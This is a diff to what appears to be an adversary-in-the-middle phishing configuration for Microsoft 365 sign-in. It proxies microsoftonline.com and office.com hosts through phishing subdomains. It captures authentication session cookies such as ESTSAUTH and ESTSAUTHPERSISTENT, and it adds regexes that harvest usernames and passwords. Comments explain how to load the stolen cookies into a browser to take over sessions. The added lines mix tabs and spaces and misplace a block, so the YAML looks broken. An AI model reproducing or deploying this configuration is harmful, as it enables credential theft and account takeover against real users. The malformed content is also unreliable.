@@ -5,7 +5,7 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
   - {phish_sub: '', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
-  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: true}
   - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
   - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
   - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.com', session: true, is_landing: false}
@@ -58,10 +58,14 @@ sub_filters:
     
 auth_tokens:
   - domain: '.login.microsoftonline.com'
-    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp']   	
+    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState', '.*,regexp'] 
+    type: 'cookie'	
   - domain: 'login.microsoftonline.com'
     keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie', '.*,regexp']  
-    type: 'cookie'	
+	type: 'cookie'
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+	type: 'cookie'
 
 # GUIDE TO GET SESSION FROM COOKIES
 # 1) Insert The Captured cookies in browser(Use Any Proper Extention)
@@ -116,6 +120,17 @@ force_post:
        - {key: 'wresult', search: 'http\:\/\/adfs\.example\.com\:443', value: 'http://adfs.example.com'}
 
     type: 'post'
+	
+
+	credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
 # Use https://regex101.com to find appropriate regex format to match the post fields to capture.    
 login:
   domain: 'www.office.com'
